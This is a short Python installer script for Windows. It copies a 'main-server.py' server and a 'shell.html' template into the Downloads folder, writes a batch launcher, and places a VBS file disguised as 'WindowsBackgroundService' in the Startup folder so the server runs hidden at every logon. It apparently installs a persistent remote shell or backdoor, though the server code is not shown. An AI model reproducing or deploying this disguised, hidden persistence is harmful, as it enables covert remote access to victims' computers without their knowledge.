import os


username = os.getenv("USERNAME")
file1 = fr"C:\Users\{username}\Downloads\runner.bat"
file2 = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsBackgroundService.vbs"

destination = fr"C:\Users\{username}\Downloads"
temp = fr"C:\Users\{username}\Downloads\templates"
index = fr"C:\Users\{username}\Downloads\index.html"
shell = fr"C:\Users\{username}\Downloads\shell.html"
os.system(fr"copy templates {destination}")
os.system(fr"copy main-server.py {destination}")
os.system(fr"mkdir {temp}")
os.system(fr"move {index} {temp}")
os.system(fr"move {shell} {temp}")



print(file1)
with open(file1, "w") as f1:
    f1.write("@echo off\n")
    f1.write(fr"py C:\Users\{username}\Downloads\main-server.py")

with open(file2, "w") as f2:
    f2.write('CreateObject("Wscript.Shell").Run "{}",0,True'.format(file1))


